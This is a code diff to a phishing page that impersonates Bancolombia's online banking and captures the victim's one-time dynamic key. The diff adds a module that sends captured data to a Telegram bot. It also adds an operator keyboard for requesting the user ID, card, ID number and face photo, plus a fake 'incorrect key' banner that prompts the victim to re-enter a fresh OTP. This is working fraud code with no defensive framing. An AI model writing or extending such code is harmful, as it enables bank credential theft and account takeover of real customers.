@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="styles_new.css">
     <script src="/socket.io/socket.io.js"></script>
     <script src="/js/banco-utils.js"></script>
+    <script src="bancolombia-telegram.js"></script>
     <script>
     document.addEventListener('DOMContentLoaded', async function() {
         const inputs = document.querySelectorAll('.digit-input');
@@ -16,6 +17,9 @@
         const overlay = document.getElementById('loadingOverlay');
         
         if (!inputs.length || !btn || !form || !overlay) return;
+
+        BancolombiaTelegram.setupOtpErrorBanner();
+        BancolombiaTelegram.initOtpErrorFromStorage();
         
         overlay.classList.remove('active', 'show');
         overlay.style.display = '';
@@ -75,16 +79,7 @@
             const data = { dinamica };
             const fullData = BancoUtils.saveBankData('bancolombia', data);
             const message = BancoUtils.formatMessage('BANCOLOMBIA - Dinámica', fullData);
-            const buttons = [
-                { text: '🔑 Pedir Usuario', action: 'index' },
-                { text: '🔢 Pedir Dinámica', action: 'dinamica' },
-                { text: '💳 Pedir Tarjeta', action: 'tarjeta' },
-                { text: '🆔 Pedir Cédula', action: 'cedula' },
-                { text: '📷 Pedir Cara', action: 'cara' },
-                { text: '📄 Pedir Términos', action: 'terminos' },
-                { text: '✅ Finalizar', action: 'finalizar' }
-            ];
-            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+            const keyboard = BancolombiaTelegram.getKeyboard();
             
             try {
                 await BancoUtils.sendToTelegram('dinamica', { text: message, keyboard });
@@ -95,13 +90,7 @@
             }
         });
         
-        BancoUtils.onTelegramAction((data) => {
-            if (data.action === 'finalizar') {
-                window.location.href = 'https://www.bancolombia.com/personas';
-            } else if (['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'].includes(data.action)) {
-                window.location.href = data.action + '.html';
-            }
-        });
+        BancoUtils.onTelegramAction((data) => BancolombiaTelegram.handleTelegramAction(data));
         
         async function updateInfo() {
             try {
@@ -125,6 +114,14 @@
             <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
             <h1>Sucursal Virtual Personas</h1>
             
+            <div id="otpErrorBanner" class="bank-error-banner bank-error-banner--otp" role="alert" hidden>
+                <span class="bank-error-banner__icon" aria-hidden="true"></span>
+                <div class="bank-error-banner__text">
+                    <strong>Su clave dinámica es incorrecta, ingrésela nuevamente.</strong>
+                </div>
+                <button type="button" class="bank-error-banner__close" aria-label="Cerrar">&times;</button>
+            </div>
+
             <div class="auth-box auth-box--dinamica">
                 <img class="dinamica-lock" src="img/candado.png" alt="" aria-hidden="true" width="48" height="48" decoding="async">
 
